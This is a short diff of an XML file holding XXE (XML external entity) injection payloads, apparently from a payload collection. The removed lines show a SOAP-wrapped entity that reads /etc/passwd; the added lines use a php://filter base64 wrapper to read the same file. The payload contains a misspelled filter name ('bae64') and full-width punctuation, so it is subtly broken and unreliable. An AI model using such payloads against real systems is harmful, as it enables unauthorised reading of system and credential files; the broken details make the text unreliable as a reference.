@@ -1,10 +1,3 @@
 <？xml version = "1.0"？> 
-<！DOCTYPE order [ 
-<！ELEMENT foo ANY> 
-<！ENTITY xxe SYSTEM "/etc/passwd">
-]>
-<soap：Envelope  xmlns：soap = "http://www.w3.org/2001/12/soap-envelope"  soap：encodingStyle = "http://www.w3.org/2001/12/soap-encoding" > 
-  <soap：Body  xmlns：m = "http://www.example.org/order" > 
-     <foo> ＆xxe; </ foo> 
-  </ soap：Body> 
-</ soap：Envelope>
+<！DOCTYPE order [ <！ENTITY c SYSTEM "php://filter/convert.bae64-encode/resource=/etc/passwd">]>
+<foo> ＆c; </ foo>
